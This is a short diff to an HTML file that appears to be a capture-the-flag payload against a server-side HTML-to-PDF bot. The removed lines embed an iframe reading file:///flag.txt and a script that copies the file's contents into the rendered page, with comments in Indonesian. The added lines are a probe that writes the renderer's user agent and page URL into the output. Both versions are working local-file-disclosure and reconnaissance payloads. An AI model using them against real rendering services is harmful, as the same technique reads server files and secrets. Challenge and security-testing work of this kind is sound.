@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <h1>Tunggu sebentar...</h1>
-    <iframe src="file:///flag.txt" width="100%" height="500px" frameborder="0"></iframe>
-
-    <script>
-        // Opsional: Jika bot memperbolehkan, script ini akan memindahkan teks ke body
-        // agar lebih jelas terlihat di PDF
-        setTimeout(() => {
-            try {
-                var iframe = document.querySelector('iframe');
-                var content = iframe.contentDocument.body.childNodes[0].textContent;
-                document.body.innerHTML = "<h1>FLAG FOUND:</h1><pre>" + content + "</pre>";
-            } catch(e) {
-                console.log("Iframe access blocked, but it might still show in PDF.");
-            }
-        }, 2000);
-    </script>
-</body>
-</html>
+<script>
+    document.write("User Agent: " + navigator.userAgent);
+    document.write("<br>Location: " + window.location.href);
+</script>
